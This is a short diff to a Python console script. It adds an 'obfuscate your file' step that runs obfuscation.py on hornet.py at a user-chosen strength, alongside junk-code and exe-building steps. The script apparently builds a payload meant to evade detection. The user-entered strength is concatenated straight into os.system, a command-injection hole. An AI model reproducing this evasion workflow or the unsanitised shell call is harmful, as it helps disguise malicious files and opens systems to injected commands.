@@ -56,16 +56,20 @@ while True:
         Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)
 
         obfuscate = False
+
         while True:
-            answer = input(Fore.CYAN + "\nDo you want to junk your code? (Recommended) (Y/N) " + Style.RESET_ALL)
+            answer = input(Fore.CYAN + "\nDo You Want To Obfuscate Your File?  (Y/N) " + Style.RESET_ALL)
             if answer.upper() == "Y":
+                amount = input(Fore.CYAN + "\nEnter Strength (1-100): " + Style.RESET_ALL)
                 os.system("python junk.py")
-                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
+                os.system("python obfuscation.py -i hornet.py -o hornet.py -s " + amount)
+                Write.Print(f"\n{filename} Has Been Obfuscated.", Colors.red_to_yellow)
                 break
             elif answer.upper() == "N":
                 break
             else:
                 Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+
 
         while True:
             answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
